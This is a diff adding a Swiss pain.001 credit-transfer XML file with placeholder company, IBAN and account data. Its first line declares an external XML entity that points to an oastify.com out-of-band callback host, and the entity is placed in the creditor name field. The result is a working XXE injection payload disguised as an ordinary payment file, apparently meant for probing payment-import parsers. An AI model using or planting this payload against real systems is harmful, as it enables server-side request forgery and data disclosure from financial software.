@@ -1,0 +1,78 @@
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://2y19ef46b7to7bqumqcncwlx7odf16pv.oastify.com"> ]>
+<Document xmlns="http://www.six-interbank-clearing.com/de/pain.001.001.03.ch.02.xsd" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.six-interbank-clearing.com/de/pain.001.001.03.ch.02.xsd pain.001.001.03.ch.02.xsd">
+	<CstmrCdtTrfInitn>
+		<GrpHdr>
+			<MsgId>MSG-12345-2010-10-10T00:00:00</MsgId>
+			<CreDtTm>2019-09-12T15:25:30</CreDtTm>
+			<NbOfTxs>1</NbOfTxs>
+			<CtrlSum>13.37</CtrlSum>
+			<InitgPty>
+				<Nm>Example AG</Nm>
+				<CtctDtls>
+					<Nm>Sage Start </Nm>
+					<Othr>V-2020.01)</Othr>
+				</CtctDtls>
+			</InitgPty>
+		</GrpHdr>
+		<PmtInf>
+			<PmtInfId>PMTINF-2020-09-12T15:25:30-1</PmtInfId>
+			<PmtMtd>TRF</PmtMtd>
+			<BtchBookg>true</BtchBookg>
+			<ReqdExctnDt>2020-12-01</ReqdExctnDt>
+			<Dbtr>
+				<Nm>Example AG</Nm>
+			</Dbtr>
+			<DbtrAcct>
+				<Id>
+					<IBAN>LI1708805503358670010</IBAN>
+				</Id>
+			</DbtrAcct>
+			<DbtrAgt>
+				<FinInstnId>
+					<ClrSysMmbId>
+						<ClrSysId>
+							<Cd>CHBCC</Cd>
+						</ClrSysId>
+						<MmbId>8805</MmbId>
+					</ClrSysMmbId>
+				</FinInstnId>
+			</DbtrAgt>
+			<CdtTrfTxInf>
+				<PmtId>
+					<InstrId>38</InstrId>
+					<EndToEndId>FD098317FA164BDCAFCE8C302B29FD38</EndToEndId>
+				</PmtId>
+				<PmtTpInf>
+					<LclInstrm>
+						<Prtry>CH01</Prtry>
+					</LclInstrm>
+				</PmtTpInf>
+				<Amt>
+					<InstdAmt Ccy="CHF">13.37</InstdAmt>
+				</Amt>
+				<Cdtr>
+					<Nm>Money &xxe; Receiving Company Name Incorporated</Nm>
+					<PstlAdr>
+						<PstCd>7000</PstCd>
+						<TwnNm>Chur</TwnNm>
+						<Ctry>CH</Ctry>
+					</PstlAdr>
+				</Cdtr>
+				<CdtrAcct>
+					<Id>
+						<Othr>
+							<Id>010814811</Id>
+						</Othr>
+					</Id>
+				</CdtrAcct>
+				<RmtInf>
+					<Strd>
+						<CdtrRefInf>
+							<Ref>000300475838001000107730112</Ref>
+						</CdtrRefInf>
+					</Strd>
+				</RmtInf>
+			</CdtTrfTxInf>
+		</PmtInf>
+	</CstmrCdtTrfInitn>
+</Document>
